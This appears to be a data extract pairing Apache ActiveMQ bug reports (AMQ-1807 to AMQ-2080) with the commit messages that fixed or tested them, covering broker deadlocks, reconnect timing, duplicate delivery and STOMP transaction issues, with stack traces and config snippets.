one would expect initial connection attempts to go on for at least 13 seconds (13 reconnect attempts with 1000ms delay between attempts) but in fact the error ""No uris available to connect to"" returned in less than a second.  Changing  {{useExponentialBackOff}} to {{true}} delays a failure report to about 41 seconds, which is 10ms * 2^12, which is what you'd expect with 12 reconnect attempts (13 connect attempts) starting with the default 10ms delay and doubling with every attempt, since 2^0+2^1+2^2+...2^n-1 is approx 2^n.  (I guess maxReconnectAttempts should be called maxConnectAttempts, but I'm not opening a bug about that.)  Changing maxReconnectAttempts to 12 causes the delay to be about 20 seconds, half of what it is for 13, so that checks out.

Altogether this points to the initialReconnectDelay parameter being ignored on initial connection attempts.   It is supposed to work per  http://activemq.apache.org/discovery-transport-reference.html",9dec1b18ba07a83f6d3d8f12f99710477f5e47ae,"test for https://issues.apache.org/activemq/browse/AMQ-2080 that shows use of reconnectDelay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@737703 13f79535-47bb-0310-9956-ffa450edef68"
12482868,AMQ-2078,"I'm seeing intermittent test failures in the tck in a test similar to JmsTransactionTestSupport.testReceiveRollback, except done with xa UserTransactions and through the ra.  Running the test individually always passes but running it in a group usually falis.

I've extended the JmsTransactionTestSupport to work with xa tx using the ra but this test always passes for me.",76b7822cf27204648e8bcf6d5497a3f3758c77f5,"AMQ-2078 extend transaction tests to xa in ra -- missed the pom.xml mod

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@735913 13f79535-47bb-0310-9956-ffa450edef68"
12482586,AMQ-2075,"Only info I have is from surefire report:

  <testcase time=""4.017"" name=""testQueueBrowserWith2Consumers {deliveryMode=2}"">
    <failure type=""junit.framework.AssertionFailedError"" message=""m1 is null for index: 0"">junit.framework.AssertionFailedError: m1 is null for index: 0
        at junit.framework.Assert.fail(Assert.java:47)
        at junit.framework.Assert.assertTrue(Assert.java:20)
        at junit.framework.Assert.assertNotNull(Assert.java:220)
        at org.apache.activemq.broker.BrokerTest.testQueueBrowserWith2Consumers(BrokerTest.java:148)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:585)
        at junit.framework.TestCase.runTest(TestCase.java:154)
        at junit.framework.TestCase.runBare(TestCase.java:127)
        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)
        at junit.framework.TestResult$1.protect(TestResult.java:106)
        at junit.framework.TestResult.runProtected(TestResult.java:124)
        at junit.framework.TestResult.run(TestResult.java:109)
        at junit.framework.TestCase.run(TestCase.java:118)
        at junit.framework.TestSuite.runTest(TestSuite.java:208)
        at junit.framework.TestSuite.run(TestSuite.java:203)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:585)
        at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)
        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)
        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160)
        at org.apache.maven.surefire.Surefire.run(Surefire.java:81)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:585)
        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182)
        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)
</failure>
  </testcase>",7f5e6667f4b2e281bd7a6011a8054775f2b4dbc3,"partial fix for AMQ-2075

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@745480 13f79535-47bb-0310-9956-ffa450edef68"
12482679,AMQ-2070,"There are a few issues to stop activemq
1. using jconsole and call broker.stop(), the java process of activemq will not quit, the root cause is when jetty is configured using xbean in activemq.xml, the broker.stop() does not stop jetty server so the java process will not quit, however the web admin will not work after broker.stop() and will display jsp exceptions.
2. the current activemq-console code which activemq-admin is using to do stop broker is calling terminateJVM and does not handle exceptions thrown
3. we have a use case when we stop a broker, we don't want any pending messages stuck in the broker, because it requires us to restart the broker immediately to not to lose those pending messages.It will be a problem if in real world we cannot restart it right away and those pending messages are critical. 
The solution we thought is as follows:
What we want is to use the current network of brokers forwarding mechanism to forward those pending messages to other broker which has a related consumer, then stop the broker completely and we don't need to restart the stopped broker right away. for example, we have a network of two brokers, A, and B, the client(producer/consumer) is using failover://(tcp:brokerA:port1, tcp:brokerB:port1), then when we want to stop A and it has 10 pending messages, we want stop A's transport that the client is connecting to, so client will failover to broker B, then 10 pending messages will be forwarded to broker B, then we can stop the broker A completely.

To address the above issues, attached are two patches, one for activemq-core and one for activemq-console, both patches are based on tags/activemq-5.2.0 please review them and I will appreciate if it can be applied to trunk. If you have any question regarding these changes, please let me know. Thank you.

With the patches:

Here is a sample usage:
./activemq-admin stopGracefully --connectorName ssl --queueName test*? --timeout 120 --pollInterval 20 --jmxurl service:jmx:rmi:///jndi/rmi://localhost:3616/jmxrmi

this command will stop connector ssl, and it will check queues starting with test (queueName takes regex) to make sure they have no pending messages then stop the broker. It will check the queuesize every 20 seconds and timeout in 120 seconds. If after timeout, there are still pending messages in the queues, it will not stop the broker and it will need manual check to stop the broker properly.

ADDED: 
1. the patches fix more issues for stopping the broker. if broker starts as master and waitForslave, stop will not let the java quit the process. Also if slave is started first and use failover to talk to the master, you can also stop it before it establish the connection with the master.

2. added to use localProcessId to get jmxurl, that way, activemq-admin can access jmx as a local jconsole, without jmxuser and jmxpassword, while remote jconsole still needs authentication when it is turned on. for this you need -Dcom.sun.management.jmxremote when starting activemq

There is a known issue of jmx rmi is two ports, one can be configured and the other is using random ports when a remote jconsole connects. this is not acceptable in a firewall environment. If concerned, please check my other post http://www.nabble.com/JMX-remote-managmentContext-and-firewall-to21969017.html you can use a custom agent to be able to configure two fixed ports.
",ce4c065f75dd2649bfba3e8a717c3bc6914edac0,"Fix for https://issues.apache.org/activemq/browse/AMQ-2071 and 
https://issues.apache.org/activemq/browse/AMQ-2070

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813424 13f79535-47bb-0310-9956-ffa450edef68"
12482288,AMQ-2068,"In order to be able to use ActiveMQ 5.3-SNAPSHOT inside an OSGi container (e.g. ServiceMix Kernel), two modifications are required:
- the org.apache.maven.* packages should be marked as optional imports from activemq-core
- kahadb needs to be packaged as an OSGi bundle",2deea18cc24e4f144f2ebf8d1365de9ea3ba382d,"applied patch from https://issues.apache.org/activemq/browse/AMQ-2068 with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@734981 13f79535-47bb-0310-9956-ffa450edef68"
12482752,AMQ-2020,"With large volumes of messages, some messages can arrive out of order on occasion. Scenario is hard to reproduce but a single producer and single consumer can cause the problem if the volume is sufficiently high. The Producer needs to exceed the memory limit such that the cache is filled and when the broker moves over to the store from the cache, the consumer need to ack a message that will be redelivered from the store but would normally be suppressed as a duplicate. 
One way to avoid the problem is to disable the cache for a Queue:
{code}
<amq:policyEntry queue="">"" useCache=""false"" >
{code}",63709a9a886a104312a2733adf8af7c24593f198,"test for setBatch with KahaDB AMQ-2020

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@741325 13f79535-47bb-0310-9956-ffa450edef68"
12482634,AMQ-2002,"When memory of the broker reaches its limit, the store-based cursor will page messages to temporary files or store them to a database ,thus the producer can send messages again. But if we set the destination policy with a low limit of memory, the producer will be hung because the store-based cursor will do nothing. 
I have attached a junit test case to show these diverse results.",7eac1f71328fc12f82cd80d4acbe3852e43ad130,"Apply patch from https://issues.apache.org/activemq/browse/AMQ-2002

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813965 13f79535-47bb-0310-9956-ffa450edef68"
12483053,AMQ-1993,"the blocking Java Socket API doesn't have a timeout on socketWrite invocations.
This means, if a TCP session is dropped or terminated without RST or FIN packets, the operating system it left to eventually time out the session. On the linux kernel this timeout usually takes 15 to 30minutes. 

For this entire period, the AMQ server hangs, and producers and consumers are unable to use a topic.

I have created two patches for this at the page:
http://www.hanik.com/covalent/amq/index.html

Let me show a bit more
---------------------------------
""ActiveMQ Transport: tcp:///X.YYY.XXX.ZZZZ:2011"" daemon prio=10 tid=0x0000000055d39000 nid=0xc78 runnable [0x00000000447c9000..0x00000000447cac10]
   java.lang.Thread.State: RUNNABLE
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)

This is a thread stuck in blocking IO, and can be stuck for 30 minutes during the kernel TCP retransmission attempts.
Unfortunately the thread dump is very misleading since the name of the thread, is not the destination or even remotely related to the socket it is operating on.
To mend this, a very simple (and configurable) ThreadNameFilter has been suggested to the patch, that appends the destination and helps the system administrator correctly identify the client that is about to receive data. 

-----------------------------------
	at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:581)
	at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:421)
	- locked <0x00002aaaec155818> (a org.apache.activemq.broker.region.Topic)
	at org.apache.activemq.broker.region.Topic.send(Topic.java:363)
The lock being held at this issue unfortunately makes the entire Topic single threaded. 
When this lock is being held, no other clients (producers and consumers) can publish to/receive from this topic.
And this lock can hold up to 30 minutes.
I consider solving this single threaded behavior a 'feature enhancement' that should be handled separately from this bug. Because even if it is solved, threads still risk being stuck in socketWrite0 for dropped connections that still appear to be established.

For this, I have implemented a socket timeout filter, based on a TransportFilter, this filter only times out connections that are actually writing data.

The two patches are at:
http://www.hanik.com/covalent/amq/patch-1-threadname-filter.patch
http://www.hanik.com/covalent/amq/patch-3-tcp-writetimeout.patch

the binary 0000.jar applies to both 5.1 and trunk and can be used today in existing environments. 


",0d2172bc9b5d75e97b7b004c074221807326046a,"apply threadName filter feature patch for AMQ-1993

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@710061 13f79535-47bb-0310-9956-ffa450edef68"
12482721,AMQ-1976,"Running 5.2.0 RC2 + patch AMQ-1971 

I have a network of 5 brokers, running around 50,000 messages per minute per broker within each broker and sending across a total of around 20,000 messages per minute to one of the 5 brokers via a bridge connection.  The configuration is the 5.2.0 default with broker names changed on each config and with a network connector set for autodiscovery.  

The system runs for a while then eventually on one broker (the receiving broker that is the only one with the consumers for this queue) these errors appear:

ERROR RecoveryListenerAdapter        - Message id ID:ingest1.mag.ss.com-54179-1223898804441-0:6:1:1:6134 could not be recovered from the data store - already dispatched
ERROR RecoveryListenerAdapter        - Message id ID:query1.mag.ss.com-38822-1223898893819-0:58:16388:1:48 could not be recovered from the data store - already dispatched

They appear in really high counts.

On the sending side brokers (publishers but no consumers on these brokers for this queue), these errors appear:

INFO  DemandForwardingBridge         - query2.mag.ss.com bridge to query1.mag.ss.com stopped
INFO  DiscoveryNetworkConnector      - Establishing network connection between from vm://query2.mag.ss.com to tcp://query1.mag.ss.com:61616
INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#30 and tcp://query1.mag.ss.com/10.100.0.101:61616(query1.mag.ss.com) has been established.
ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732)
javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732)
	at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445)
	at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187)
	at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)
	at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$8.onCompletion(DemandForwardingBridgeSupport.java:643)
	at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:61)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:184)
	at java.lang.Thread.run(Thread.java:619)
INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#30 and tcp://query1.mag.ss.com/10.100.0.101:61616 shutdown due to a local error: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (732)
INFO  DemandForwardingBridge         - query2.mag.ss.com bridge to query1.mag.ss.com stopped
INFO  DiscoveryNetworkConnector      - Establishing network connection between from vm://query2.mag.ss.com to tcp://query1.mag.ss.com:61616
INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#32 and tcp://query1.mag.ss.com/10.100.0.101:61616(query1.mag.ss.com) has been established.
ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730)
javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730)
	at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445)
	at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187)
	at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)
	at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$8.onCompletion(DemandForwardingBridgeSupport.java:643)
	at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:61)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:184)
	at java.lang.Thread.run(Thread.java:619)
INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#32 and tcp://query1.mag.ss.com/10.100.0.101:61616 shutdown due to a local error: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730)
ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (729)
javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (729)
	at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445)
	at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187)
	at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)
	at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)
...


",bc7e759662564c1af87b8655d31711a2f3ad36c8,"test case for AMQ-1976, just remove the short circut return to try

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@705259 13f79535-47bb-0310-9956-ffa450edef68"
12482225,AMQ-1959,<NA>,4d6043aa94227b4b2604394e0c855c9869c211f4,"fix regression AMQ-1959

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@700746 13f79535-47bb-0310-9956-ffa450edef68"
12482719,AMQ-1957,"Here is an all in one patches applied on version 5.0.0.19

It is composed from 4 files directly applicable on Fuse v5.0.0.19

They all concern package 'org.apache.activemq.broker.region'.

The effects of this patch are the following:

    * Avoid multiple dispatching of same message to multiple subscription multiple time (Multiple dispatch to client consumers in some cases = > causes multiple commits for same message => causing negatives counters on Pending Message Count)
    * Avoid the broker hanging when a queue has numerous messages in one queue
    * MB-386 + Correction
    * Some other little glitches
",92e143155b636dd2a6f6730fb5c65dbb8d1ec970,"a test variant to validate AMQ-1957

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@712117 13f79535-47bb-0310-9956-ffa450edef68"
12482670,AMQ-1943,"SVN revision 560783 modifies only 1 of the 2 DefaultJDBCAdapater.doRecoverNextMessages() methods to break from the loop if the listener.recoverMessage() returns false. The doRecoverNextMessages for queues just logs it at debug level.
Shouldn't that method break from the loop too? I'm seeing the same problems described in AMQ-1080 with the queues on our test and production servers: 
1) lots of ' Stopped recover next messages' messages and CPU usage going way up
2) messages being skipped

",4d0e57261cf613fb62e6cf45f6e47452abf84230,"Fix for https://issues.apache.org/activemq/browse/AMQ-1943

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@697953 13f79535-47bb-0310-9956-ffa450edef68"
12482682,AMQ-1936,"Hello,

We are receiving duplicate messages when processing a moderate numbers of messages ( ~60,000 ), I have attached a JUNIT test which re-produces the issue on my machine with the broker configuration file used. Please note that It does take a few minutes to generate the test failure.

The test needs to be run with increased heap memory using the JMV option -Xmx512m

We initially found the issue using the IONA Fuse version 5.1.0.0 which would produce the same issue at 30,000 messages and without persistence storage. I later downloaded the ActiveMQ 5.1.0 version which would pass at 30,000 but fail at 60,000.

It is causing major issues for our project and hindering our application from going to production.

",2b28443a05a542c5030d4fa6da785f7ff068fd9b,"Added test case for https://issues.apache.org/activemq/browse/AMQ-1936

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@777803 13f79535-47bb-0310-9956-ffa450edef68"
12482682,AMQ-1936,"Hello,

We are receiving duplicate messages when processing a moderate numbers of messages ( ~60,000 ), I have attached a JUNIT test which re-produces the issue on my machine with the broker configuration file used. Please note that It does take a few minutes to generate the test failure.

The test needs to be run with increased heap memory using the JMV option -Xmx512m

We initially found the issue using the IONA Fuse version 5.1.0.0 which would produce the same issue at 30,000 messages and without persistence storage. I later downloaded the ActiveMQ 5.1.0 version which would pass at 30,000 but fail at 60,000.

It is causing major issues for our project and hindering our application from going to production.

",1d5440a1cd6239b10312c612171cd004949b476c,"reopen https://issues.apache.org/activemq/browse/AMQ-1936 - excluded test case as it hangs on some linux machines ... needs to be ivestigated further

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@779556 13f79535-47bb-0310-9956-ffa450edef68"
12482623,AMQ-1926,"Over a long period data files fill up in the activemq-data/borker1/data/journal directory. Scenario is single queue, persistent producer and consumer, consumer periodically stalls to allow messages to build up in broker.
Problem appears to be related to message ack before async message store gets a chance to persist messages. Reference to active data file remain which stops them being cleaned up by the periodic checkpoint.
This limits the available up time of the broker with large volumes of messages as excessive amounts of disk space are consumed.

Using syncOnWrite=true or setting a AMQPersistenceAdapter.maxCheckpointMessageAddSize=0 will help avoid the problem, both of which will effect performance.",c2fbfa9f2ae40303b6decd95fbc1457188cf0cdc,"adendum to https://issues.apache.org/activemq/browse/AMQ-1926

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@691665 13f79535-47bb-0310-9956-ffa450edef68"
12482577,AMQ-1915,"Creating an {{ActiveMQConnectionFactory}}, and then calling {{setExclusiveConsumer(true)}}, does *not* cause queues created from that factory's connections to have the exclusive consumer feature. I'm pretty sure this is due to {{configureConnection()}} not calling {{setExclusiveConsumer()}} on new connections. This can be seen in the source code for {{ActiveMQConnectionFactory.configureConnection}}, release 5.1.",932ddd2318b883e07208a4047e1e80d2718b1352,"Fix for https://issues.apache.org/activemq/browse/AMQ-1915

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@691130 13f79535-47bb-0310-9956-ffa450edef68"
12482780,AMQ-1893,"1. Start ActiveMQ 5.0 or 5.1 using the activemq.xml config file uploaded.
2. Run TestProducer
3. Open Browser : http://localhost:8165/admin，enter 'Queues' page,you can see now the 'Number of Pending Messages' of queue 'TEST' is 30000.
4. Run TestConsumer,
5. The Consumer will stop consuming messages, now you refresh the 'Queues' page, the 'Number of Pending Messages' is large than zero

That's The problem, but why? Is the problem in my code or in ActiveMQ?",54a152039391c15f13507f23630169b2784b8fa3,"add test that validates https://issues.apache.org/activemq/browse/AMQ-1893 is resolved on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@964051 13f79535-47bb-0310-9956-ffa450edef68"
12483064,AMQ-1886,"The JDBC store's primary use case has always been to be used in conjunction with the journal.  When the journal is in place it recovers any partially committed transaction and makes the JDBC store consistent.  When the journal is not used, for example when you are setting up an HA solution with an HA JDBC database, then it has been noticed that on a DB failure you may get partial commits of JMS transactions.
",20972bfdaf9e9602fa6f3b799118ce7ee1bff0b6,"https://issues.apache.org/activemq/browse/AMQ-1886 - another test, but issue cannot be reproduced with embeded derby

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@820268 13f79535-47bb-0310-9956-ffa450edef68"
12482113,AMQ-1866,Muliple consumers on a queue and only run as fast as the slowest consumer,e027f8ff292b1a2d6c8d3d65c084b8d395dd820b,"Test case for AMQ-1866


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@678830 13f79535-47bb-0310-9956-ffa450edef68"
12482608,AMQ-1860,"The documentation for TCP transport, shows soTimeout, connectionTimeout and socketBufferSize as properties without a prefix.
The code in TcpTransportServer.java doesn't have the support for these properties.
hence setting a URL to tcp://192.168.3.3:61616?soTimeout=180000 does nothing, and defaults to soTimeout=0 (which is a bad value due to how sockets get closed, and can cause the system to hang on  a socketWrite call, causing the rest of the server to hang, but I can explain that on the dev lists for those interested)

Bug description: Transport properties are incorrectly document or implemented

There are two solutions to this bug:

1. The preferred, would be to fix the documentation
http://activemq.apache.org/tcp-transport-reference.html
the mentioned options will work if they are prefixed with ""transport.""
so the URL would be 
tcp://192.168.3.3:61616?transport.soTimeout=180000

2. Add the properties with their getters/setters into TcpTransportServer.java and then during the handleSocket method add them to the options map

Please note, this bug refers to the soTimeout setting on the socket that gets created on the server when a producer/consumer connects in using TCP

best
Filip",46b01cc8622be54afae9b9637d9ed21f910c6bd0,"Applied patch for  https://issues.apache.org/activemq/browse/AMQ-1860

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@685808 13f79535-47bb-0310-9956-ffa450edef68"
12482478,AMQ-1838,<NA>,ec3d9adae5e60593511cb5adb74b71c0ae1ce3a7,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-1838

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@690645 13f79535-47bb-0310-9956-ffa450edef68"
12482251,AMQ-1834,The HashIndex doesn't calculate the hash bin number correctly when resizing,bdbced30d8ca6b948450c0fae971d9279b5bd23a,"Fix for https://issues.apache.org/activemq/browse/AMQ-1834

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@673143 13f79535-47bb-0310-9956-ffa450edef68"
12483206,AMQ-1817,"When a producer STOMP client SEND messages with a ""receipt"" header the consumer STOMP client MESSAGE should not contain the ""receipt"" header, mainly because that header is to be processed solely by AMQ (and only when it receives the SEND).",24f73a53c12b71d6006b1b2a283c5f388ed15e20,"Fix for: https://issues.apache.org/activemq/browse/AMQ-1817

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@906101 13f79535-47bb-0310-9956-ffa450edef68"
12482165,AMQ-1810,"If a client tries to connect to the broker and the broker is not available the client can't be stopped because of a deadlock in ActiveMQConnection.

The problem is that the thread that wants to establish the connection is stuck in {{syncSendPacket()}} which is called from inside {{ensureConnectionInfoSent()}} which is {{synchronized}} (and holds the lock on the ActiveMQConnection instance). The call to {{close()}} calls {{stop()}} and this will call {{checkClosedOrFailed()}} which is {{synchronized}}, too, and there is the deadlock.

The patch has removed the {{synchronized}} on the {{ensureConnectionInfoSent()}} and uses a mutex instead to prevent calling the method unsynchronized.

Another problem is that {{PooledConnectionFactory}} is triggered from Spring classes to create connections even if the PooledConnectionFactory was stopped (call to {{stop()}} and the new created connections can not be stopped normally later. 
I have added a {{stopped}} flag that prevents the creation of new connecions after {{stop()}} was called.

I think the issue AMQ-1470 is related to the same problem. 
The patch also contains the patch for AMQ-1791.",e38da226ef41e31d363102c744c351b540098856,"apply fix for https://issues.apache.org/activemq/browse/AMQ-1810

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@669511 13f79535-47bb-0310-9956-ffa450edef68"
12483069,AMQ-1807,"As requested by Dejan Bosanac, I'm adding this ticket. I'm willing to help fix it, ie. I can get my hands dirty, but I must have some pointers on where to look because (unfortunately) I don't have much time to learn ActiveMQ's internals and architecture.

A copy of the email I sent to the users mailing-list:
=============================================

I'm currently struggling to understand the reason behind that's causing the behaviour described in the subject: I'm connecting to activemq via stomp on a python app. Because I need to have the messages rolled back in case of some processing failure I'm wrapping the message processing in the following way:

 message received -> start transaction -> ack message in transaction ->
process message -> if no exception commit tx, else rollback transaction


AFAIK, this is the only way of making message unacknowledgement possible with stomp. Also, this is a single client connection, ie. I'm using a
single client connection to create a message processing daemon, all messages are sent and received via this single connection to the MQ server.

Here's a telnet session that can be used to reproduce the problem (open jconsole and send 5 text messages to the queue):

% telnet localhost 61613
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
CONNECT

^@
CONNECTED
session:ID:starfish-53281-1213736462979-2:2


SUBSCRIBE
destination: /queue/testq
ack: client
activemq.prefetchSize: 1

^@
MESSAGE
message-id:ID:starfish-53281-1213736462979-3:3:1:1:1
destination:/queue/testq
timestamp:1213736837743
expires:0
priority:0

1
BEGIN
transaction: 1

^@
ACK
message-id:ID:starfish-53281-1213736462979-3:3:1:1:1
transaction: 1

^@
MESSAGE
message-id:ID:starfish-53281-1213736462979-3:4:1:1:1
destination:/queue/testq
timestamp:1213736840224
expires:0
priority:0

2
MESSAGE
message-id:ID:starfish-53281-1213736462979-3:5:1:1:1
destination:/queue/testq
timestamp:1213736842611
expires:0
priority:0

3
ABORT   
transaction: 1

^@
BEGIN 
transaction:2

^@
ACK
message-id:ID:starfish-53281-1213736462979-3:4:1:1:1
transaction:2

^@
ABORT
transaction:2

^@
ACK
message-id:ID:starfish-53281-1213736462979-3:5:1:1:1

^@


I see a couple of issues here:

#1) even though I specified activemq.prefetchSize to 1 in the subscription command, the connector dispatches two messages in a row

#2) no more messages are dispatched after aborting the transaction/acknowledging the last received message. Even if the second message isn't wrapped in a transaction, message dispatch stops there.

To add to the confusion, if I don't use transactions _at all_, my client keeps getting messages, one by one, ie. no two messages are sent together, I only get a new message after ACK'ing the previous one.

I think I may be stepping into the realms of a buggy STOMP connector. Please tell me if I'm missing something obvious that fixes this issue
(hence making it a non-issue) or if indeed the STOMP connector has problems.",a15e6efabd94fd74fcdd28c3326f3096b9b7bbec,"https://issues.apache.org/activemq/browse/AMQ-1807 - aborting transaction test revisited + solution

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@804192 13f79535-47bb-0310-9956-ffa450edef68"
